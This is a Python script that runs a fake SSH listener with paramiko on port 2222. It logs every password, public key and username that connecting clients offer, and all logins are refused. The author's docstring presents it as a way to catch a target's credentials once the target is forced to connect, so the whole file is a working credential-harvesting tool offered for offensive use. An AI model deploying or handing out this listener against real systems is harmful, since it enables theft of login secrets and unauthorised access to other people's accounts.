#!/usr/bin/python3

"""
author: otter ʕ •ᴥ•ʔ

This is a simple SSH listener that logs all authentication attempts.
If a target is forced to connect to this listener, its possible to catch the
credentials used to login.
"""

import threading
import socket
import paramiko


class SSHServer(paramiko.ServerInterface):

    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        print(
            f"Authentication attempt: username='{username}', password='{password}'")
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        print(f"Authentication attempt: username='{username}', key='{key}'")
        return paramiko.AUTH_FAILED

    def check_auth_none(self, username):
        print(f"Authentication attempt: username='{username}'")
        return paramiko.AUTH_FAILED

    def check_channel_exec_request(self, channel, command):
        print(f"Command received: '{command}'")
        channel.send(f"You executed '{command}'\n")
        channel.close()
        return True

    def get_allowed_auths(self, username):
        return 'password,publickey'

    def handle_event(self, event):
        self.event.set()


# the listener runs by default on port 2222
def start_server():
    host_key = paramiko.RSAKey.generate(2048)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', 2222))
    server_socket.listen(100)

    while True:
        client_socket, addr = server_socket.accept()
        transport = paramiko.Transport(client_socket)
        transport.add_server_key(host_key)
        ssh_server = SSHServer()
        transport.start_server(server=ssh_server)
        ssh_server.event.wait()
        transport.close()


if __name__ == '__main__':
    start_server()
